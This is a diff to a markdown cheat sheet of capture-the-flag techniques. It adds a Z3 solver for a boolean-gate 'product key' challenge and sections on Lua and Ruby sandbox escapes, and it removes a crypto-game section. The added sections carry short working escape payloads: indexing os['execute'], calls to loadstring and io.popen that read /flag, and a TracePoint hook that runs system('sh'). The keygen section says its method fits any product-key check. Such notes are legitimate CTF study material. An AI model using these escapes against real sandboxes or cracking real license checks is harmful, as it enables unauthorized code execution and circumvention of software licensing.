@@ -11,6 +11,7 @@
 - [Z3 Constraint Solving](#z3-constraint-solving)
   - [YARA Rules with Z3](#yara-rules-with-z3)
   - [Type Systems as Constraints](#type-systems-as-constraints)
+  - [Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)](#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026)
 - [Kubernetes RBAC Bypass](#kubernetes-rbac-bypass)
   - [K8s Privilege Escalation Checklist](#k8s-privilege-escalation-checklist)
 - [Floating-Point Precision Exploitation](#floating-point-precision-exploitation)
@@ -20,8 +21,8 @@
   - [Red Flags in Challenges](#red-flags-in-challenges)
   - [Quick Test Script](#quick-test-script)
 - [Custom Assembly Language Sandbox Escape (EHAX 2026)](#custom-assembly-language-sandbox-escape-ehax-2026)
-- [memfd_create Packed Binaries](#memfd_create-packed-binaries)
-- [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
+- [Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)](#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016)
+- [Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)](#ruby-sandbox-escape-via-tracepointtrace-hitcon-2017)
 - [References](#references)
 
 ---
@@ -207,6 +208,56 @@ matches = re.findall(r"\(\s*([^)]+)\s*\)\s*(\w+)_t", source)
 # Convert to Z3 constraints and solve
 ```
 
+### Z3 SAT Solving for Boolean Logic Gate Networks (BSidesSF 2026)
+
+**Pattern (flag-factory-pro):** A "product key" validation system is implemented as a network of 250 boolean logic gates (AND, OR, XOR, NOT) connected by wires. Given 125 boolean input bits and the gate truth values (all gates must output True), find a valid assignment of input bits. This is a classic satisfiability (SAT) problem solvable with Z3.
+
+```python
+from z3 import *
+import base64
+
+# Parse the gate network from challenge data
+data = base64.b64decode(registration_request)
+gates = parse_gates(data)  # List of (gate_type, input_wires, output_wire)
+
+# Create 125 boolean variables for input bits
+inputs = [Bool(f"x_{i}") for i in range(125)]
+
+# Map wire IDs to Z3 expressions
+wires = {i: inputs[i] for i in range(125)}
+
+solver = Solver()
+for gate_type, in1, in2, out in gates:
+    w1 = wires[in1]
+    w2 = wires[in2] if in2 is not None else None
+
+    if gate_type == "AND":
+        wires[out] = And(w1, w2)
+    elif gate_type == "OR":
+        wires[out] = Or(w1, w2)
+    elif gate_type == "XOR":
+        wires[out] = Xor(w1, w2)
+    elif gate_type == "NOT":
+        wires[out] = Not(w1)
+
+    # All gate outputs must be True
+    solver.add(wires[out] == True)
+
+if solver.check() == sat:
+    model = solver.model()
+    # Extract 125 bits, encode as base32 in 5-bit groups
+    bits = [1 if is_true(model[inputs[i]]) else 0 for i in range(125)]
+    # Convert to product key format
+    key = bits_to_base32(bits)
+    print(f"Product key: {key}")
+```
+
+**Key insight:** Boolean logic gate networks are directly expressible as Z3 constraints. Each gate becomes one constraint (`And`, `Or`, `Xor`, `Not`), and the requirement that all outputs are True constrains the solution space. Even with 125 input variables and 250 gates, Z3 solves this in milliseconds. Any "keygen" or "product key" challenge with observable validation logic can be modeled this way.
+
+**When to recognize:** Challenge involves product key validation, license key generation, circuit/gate diagrams, or registration code verification. If the validation logic is extractable (from binary, network capture, or provided spec), model it as a SAT/SMT problem. Z3 handles boolean, bitvector, integer, and real arithmetic constraints.
+
+**References:** BSidesSF 2026 "flag-factory-pro"
+
 ---
 
 ## Kubernetes RBAC Bypass
@@ -364,87 +415,56 @@ STDOUT E                         # print flag
 
 ---
 
-## memfd_create Packed Binaries
+## Lua Sandbox Escape via Function Name Injection (CSAW CTF 2016)
 
-```python
-from Crypto.Cipher import ARC4
-cipher = ARC4.new(b"key")
-decrypted = cipher.decrypt(encrypted_data)
-open("dumped", "wb").write(decrypted)
+Lua sandboxes that filter `load()` and `os.execute()` by name can be bypassed if function references exist in other accessible tables or through string concatenation of function names.
+
+```lua
+-- Common Lua sandbox restrictions:
+-- os.execute blocked, load blocked, require blocked
+
+-- Bypass 1: If string.find is available, use it to test for allowed functions
+-- then access via table indexing
+local f = os["execute"]  -- table index bypass if only os.execute() call is blocked
+f("cat /flag")
+
+-- Bypass 2: Use loadstring (alias for load in Lua 5.1)
+loadstring("os.execute('cat /flag')")()
+
+-- Bypass 3: Via debug library (if available)
+debug.getregistry()  -- access internal Lua registry
+
+-- Bypass 4: Bytecode execution (compile outside, load bytecode)
+-- Compile payload: luac -o payload.luac payload.lua
+-- Load bytecode in sandbox (may bypass source-level filters)
+
+-- Bypass 5: Concatenation to build function names
+local cmd = "exe" .. "cute"
+os[cmd]("cat /flag")
+
+-- Bypass 6: Via io library
+io.popen("cat /flag"):read("*a")
 ```
+
+**Key insight:** Lua sandboxes typically filter specific function *calls* but not *table lookups*. Access blocked functions through table indexing (`os["execute"]`), string concatenation for function names, or alternate I/O libraries (`io.popen`). Also check if `loadstring` (Lua 5.1 alias for `load`) is unblocked.
 
 ---
 
-## Multi-Phase Interactive Crypto Game (EHAX 2026)
+## Ruby Sandbox Escape via TracePoint.trace (HITCON 2017)
 
-**Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.
+**Pattern:** Ruby sandbox uses `set_trace_func` to monitor execution and block dangerous calls. Bypass: register a `TracePoint` hook for `:c_call` events. TracePoint fires at the C-extension level, before Ruby-level `set_trace_func` hooks activate.
 
-**Phase structure:**
-1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
-2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
-3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.
-
-**Commitment-reveal (HMAC binding):**
-```python
-import hmac, hashlib
-
-def compute_binding_token(session_nonce, answer):
-    """Server verifies your answer commitment before revealing result."""
-    message = f"answer:{answer}".encode()
-    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()
-
-# Flow: send token first, then server reveals state, then send answer
-# Server checks: HMAC(nonce, answer) == your_token
-# Prevents changing your answer after seeing the state
+```ruby
+TracePoint.trace(:c_call) do |tp|
+  system('sh')
+end
 ```
 
-**GF(2^8) arithmetic for game drain calculations:**
-```python
-# Galois Field GF(256) used in some game mechanics (Nim variants)
-# Nim-value XOR determines winning/losing positions
+The hook fires on the next C-level call (e.g., `puts`, any method call), executing `system('sh')` before the sandbox monitor can intercept it.
 
-def gf256_mul(a, b, poly=0x11b):
-    """Multiply in GF(2^8) with irreducible polynomial."""
-    result = 0
-    while b:
-        if b & 1:
-            result ^= a
-        a <<= 1
-        if a & 0x100:
-            a ^= poly
-        b >>= 1
-    return result
+**Why it works:** `TracePoint` (introduced in Ruby 2.0) operates at a lower level than `set_trace_func`. `:c_call` hooks fire when any C-implemented method is invoked, which happens before the Ruby event system that `set_trace_func` relies on processes the event.
 
-# Nim game with GF(256) move rules:
-# Position is losing if Nim-value (XOR of pile Grundy values) is 0
-# Optimal move: find pile where removing stones makes XOR sum = 0
-```
-
-**Game tree memoization (C++ for performance):**
-```python
-# Python too slow for large state spaces — use C++ with memoization
-# State compression: encode all pile sizes into single integer
-# Cache: unordered_map<state_t, bool> for win/loss determination
-
-# Python fallback for small games:
-from functools import lru_cache
-
-@lru_cache(maxsize=None)
-def is_winning(state):
-    """Returns True if current player can force a win."""
-    state = tuple(sorted(state))  # Normalize for caching
-    for move in generate_moves(state):
-        next_state = apply_move(state, move)
-        if not is_winning(next_state):
-            return True  # Found a move that puts opponent in losing position
-    return False  # All moves lead to opponent winning
-```
-
-**Key insights:**
-- Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
-- HMAC commitment-reveal prevents guessing; you must compute the correct answer
-- GF(256) Nim variants require Sprague-Grundy theory, not brute force
-- When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization
+**Key insight:** `TracePoint` operates at a lower level than `set_trace_func` in Ruby — C-call hooks fire before Ruby-level event hooks, allowing sandbox escape. Any subsequent C-method call (even benign ones) triggers the payload.
 
 ---
 
@@ -453,9 +473,11 @@ def is_winning(state):
 - LACTF 2026 "CTFaaS": K8s RBAC bypass via hostPath
 - 0xL4ugh CTF: PyInstaller + opcode remapping
 - 0xFun 2026 "MazeRunna": Roblox version history + binary place file parsing
-- EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
 - EHAX 2026 "Chusembly": Custom assembly language with Python MRO chain RCE
+- HITCON 2017: Ruby TracePoint sandbox escape
 
 ---
 
-See also: [games-and-vms-2.md](games-and-vms-2.md) for ML weight perturbation negation, cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, LoRA adapter merging, De Bruijn sequences, Brainfuck instrumentation, WASM memory manipulation, and neural network encoder collisions.
+See also: [games-and-vms-2.md](games-and-vms-2.md) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.
+
+See also: [games-and-vms-3.md](games-and-vms-3.md) for memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, and BuildKit daemon build secret exploitation.
